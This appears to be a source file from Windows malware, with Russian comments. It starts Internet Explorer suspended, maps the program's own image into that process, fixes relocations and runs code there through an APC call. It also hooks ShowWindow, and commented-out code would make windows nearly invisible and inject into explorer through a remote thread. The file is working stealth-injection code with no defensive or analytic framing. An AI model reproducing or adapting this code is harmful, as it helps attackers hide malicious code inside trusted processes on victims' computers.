#include "stdafx.h"
//Wdm.h (include Wdm.h, Ntddk.h, or Ntifs.h)

#include "Hook.h"
#include "Getapi.h"
#include "Splice.h"


#define STATUS_SUCCESS                          ((NTSTATUS)0x00000000L) // ntsubauth
#define SIZEOFJUMP	5

typedef BOOL ( WINAPI *PShowWindow   )( HWND hWnd, int Cmd );
PShowWindow    Real_ShowWindow;

BOOL WINAPI Hook_ShowWindow(HWND hWnd, int Cmd)
{
//	OutputDebugString("Hook_ShowWindow");
	//if (hWnd!=NULL)
	{
	//	HWND hParent = (HWND)pGetParent(hWnd);
		
	//	if (hParent!=NULL)
	//		if (!(bool)pIsWindowVisible(hParent))
			{		
				//OutputDebugString("Hiden Window");
				char str[260];
				pGetWindowTextA(hWnd,str,260);
			
				if (strstr(str,"Internet Explorer"))
				{
				//	DbgMsg(str,(int)hWnd,"!");
					HWND hParent = (HWND)pGetParent(hWnd);
					pGetWindowTextA(hParent,str,260);
				//	DbgMsg(str,(int)hParent,"hParent!");
				}
				/*pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_TOOLWINDOW) ;
				pSetWindowLongA(hWnd, GWL_EXSTYLE, (LONG)pGetWindowLongA(hWnd, GWL_EXSTYLE) | WS_EX_LAYERED );
				pSetLayeredWindowAttributes(hWnd, 0, 1, LWA_ALPHA);
				Cmd=0;*/
			}
	}	
	return Real_ShowWindow(hWnd, Cmd);
}




DWORD GetImageBase()
{
/*
(28.12.2010 06:00:39) samuel_ro: Попробуй в асм блоке код: 
(28.12.2010 06:00:48) samuel_ro: db 0xe8
(28.12.2010 06:00:56) samuel_ro: dd 0x00000000
(28.12.2010 06:01:12) samuel_ro: pop eax //eax <- eip
(28.12.2010 06:02:57) samuel_ro: код 0xe800000000 эквивалентен call +0, т.е. вызов команды следующей за call
*/
	
	DWORD dwRet = 0;
	
	DWORD* Addr = (DWORD *)&GetImageBase;

	__asm
	{
			mov EAX, Addr
			and eax, 0FFFF0000h
		find:
			cmp word ptr [ eax ], 0x5A4D
			je end
			sub eax, 00010000h
			JMP find
		end:
			mov [dwRet], eax
	}

	return dwRet;
}
typedef struct 
{
	WORD	Offset:12;
	WORD	Type:4;
} IMAGE_FIXUP_ENTRY, *PIMAGE_FIXUP_ENTRY;

void ProcessRelocs( PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize )
{
	PIMAGE_BASE_RELOCATION Reloc = Relocs;

	while ( (DWORD)Reloc - (DWORD)Relocs < RelocSize ) 
	{
		if ( !Reloc->SizeOfBlock )
		{
			break;
		}

		PIMAGE_FIXUP_ENTRY Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)Reloc + sizeof(IMAGE_BASE_RELOCATION));

		for ( ULONG r = 0; r < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++ ) 
		{
			DWORD dwPointerRva = Reloc->VirtualAddress + Fixup->Offset;

			if ( Fixup->Offset != 0  )
			{
				*(PULONG)((ULONG)ImageBase + dwPointerRva) += Delta;
			}

			Fixup++;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)( (ULONG)Reloc + Reloc->SizeOfBlock );
	}

	return;
}

bool InjectCode2( HANDLE hProcess, HANDLE hThread, DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwBase = GetImageBase();
	DWORD dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase) + ((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

	HANDLE hMap = pCreateFileMappingA( (HANDLE)-1, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL );

    LPVOID lpView = pMapViewOfFile( hMap, FILE_MAP_WRITE, 0, 0, 0 );

	if ( lpView == NULL )
	{
		return false;
	}

	m_memcpy( lpView, (LPVOID)dwBase, dwSize );

	DWORD dwViewSize    = 0;
	DWORD dwNewBaseAddr = 0;

	NTSTATUS Status = (NTSTATUS)pZwMapViewOfSection( hMap, hProcess, &dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, 1, 0, PAGE_EXECUTE_READWRITE );

	if ( Status == STATUS_SUCCESS )
	{
		PIMAGE_DOS_HEADER dHeader   = (PIMAGE_DOS_HEADER)dwBase;
		PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		ULONG RelRVA   = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		ULONG RelSize  = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs( (PIMAGE_BASE_RELOCATION)( dwBase + RelRVA ), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize );		

		DWORD dwAddr = (DWORD)f_Main - dwBase + dwNewBaseAddr;

		if ( (NTSTATUS)pZwQueueApcThread( hThread, (LPTHREAD_START_ROUTINE)dwAddr, NULL, NULL, NULL ) == STATUS_SUCCESS )
		{
			ResumeThread( hThread );
		}
		else
		{
			pTerminateThread( hThread, 0 );
		}
	}

	pUnmapViewOfFile( lpView );
    pCloseHandle( hMap );

	return true;
}
bool RunFileEx( WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread )
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	
	//	ZeroMemory( &si, sizeof( STARTUPINFOW ) );
	//	ZeroMemory( &pi,  sizeof( PROCESS_INFORMATION );
	m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
	m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
	si.cb		   = sizeof( STARTUPINFO );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = 1;

	if ( (BOOL)pCreateProcessW( Path, NULL, NULL, NULL, FALSE, dwFlags, NULL, NULL, &si, &pi ) != 0 )
	{
		*hProcess = pi.hProcess;
		*hThread  = pi.hThread;

		return true;
	}	

	return false;
}
bool CreateExplorer( PHANDLE hProcess, PHANDLE hThread )
{
	//WCHAR Explorer[] = {'e','x','p','l','o','r','e','r','.','e','x','e',0};

	TCHAR sPath[1024] = L"";
	
	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, sPath);	
	lstrcat( sPath, L"\\Internet Explorer\\iexplore.exe" );

	HANDLE hTmpProcess = NULL;
	HANDLE hTmpThread  = NULL;

	bool ret = RunFileEx( sPath, CREATE_SUSPENDED, &hTmpProcess, &hTmpThread );

	if ( ret )
	{
		*hProcess = hTmpProcess;
		*hThread  = hTmpThread;
	}

	return ret;
}

bool JmpToExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	HANDLE hProcess = NULL;
	HANDLE hThread	= NULL;

	bool bRet = false;

	if ( CreateExplorer( &hProcess, &hThread ) )
	{
		if ( InjectCode2( hProcess, hThread, f_Main ) )
		{
			return true;
		}
		else
		{
			TerminateThread( hThread, 0 );
		}
	}

	return false;
}
DWORD WINAPI ExplorerRoutine( LPVOID lpData )
{

//OutputDebugStringA("начинаем подмену адреса Hook_ShowWindow");
		if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow ) )
		{  
			__asm mov [Real_ShowWindow], eax			
		}
	//	OutputDebugStringA("Started Hook Real_ShowWindow");
		return 0;

}
/*bool InjectIntoExplorer( DWORD (WINAPI f_Main)(LPVOID) )
{
	DWORD dwPid = GetExplorerPid();

	if ( dwPid == 0 )
	{
		return false;
	}

	OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
	CLIENT_ID ClientID;

	ClientID.UniqueProcess = (HANDLE)dwPid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess;
		
	if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
	{
		return false;
	}

	DWORD dwAddr = InjectCode( hProcess, f_Main );

	bool ret = false;

	if ( dwAddr != -1 )
	{
		if ( pCreateRemoteThread( hProcess, 0, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, 0 ) != NULL )
		{
			ret = true;
		}
	}

	pZwClose( hProcess );
	
	return ret;
}*/